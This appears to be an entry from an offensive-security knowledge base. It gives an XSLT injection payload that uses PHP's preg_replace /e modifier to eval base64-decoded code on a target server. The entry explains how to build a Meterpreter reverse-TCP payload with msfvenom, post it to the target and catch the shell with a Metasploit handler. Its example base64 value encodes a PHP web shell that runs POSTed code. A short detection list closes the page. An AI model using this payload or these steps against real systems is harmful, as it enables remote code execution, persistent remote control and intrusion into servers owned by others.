---
id: cc16f77e-e3af-4c04-822c-88431834045a
name: xslt-php-eval-base64-meterpreter-payload
type: code
language: xml
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
  - PHP
tags:
  - xslt-injection
  - meterpreter
  - reverse-shell
  - rce
validated: true
---

# XSLT PHP Eval Base64 Meterpreter Payload

## Code

```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
        <xsl:template match="/">
                <xsl:variable name="eval">
                        eval(base64_decode('Base64-encoded Meterpreter code'))
                </xsl:variable>
                <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
        </xsl:template>
</xsl:stylesheet>
```

## Description

This XSLT payload decodes and executes a base64-encoded PHP Meterpreter payload using eval within a preg_replace call (exploiting the /e modifier for evaluation). It provides a method to deliver and run advanced post-exploitation agents like Meterpreter for shell access and persistence.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'Base64-encoded Meterpreter code' | Base64 string of the Meterpreter PHP payload | 'PD9waHAgZXZhbCgkX1BPU1RbJ2M2J10pOz8+' (example snippet) |

## Usage

Generate the payload with msfvenom (php/meterpreter_reverse_tcp LHOST=your_ip LPORT=4444 -f base64), insert into the variable, and POST to the target. Start a Metasploit handler to catch the reverse connection. This escalates from basic RCE to interactive control.

## Detection

- Base64 decoding or eval/preg_replace with /e in PHP logs or XSLT outputs.
- Outbound connections from the web server to attacker IPs on high ports.
- Process monitoring for php.exe spawning suspicious child processes or network activity.

## Related

- [[procedures/xslt-injection-for-php-remote-code-execution]]
- [[techniques/Command-Line Interface|T1059]]
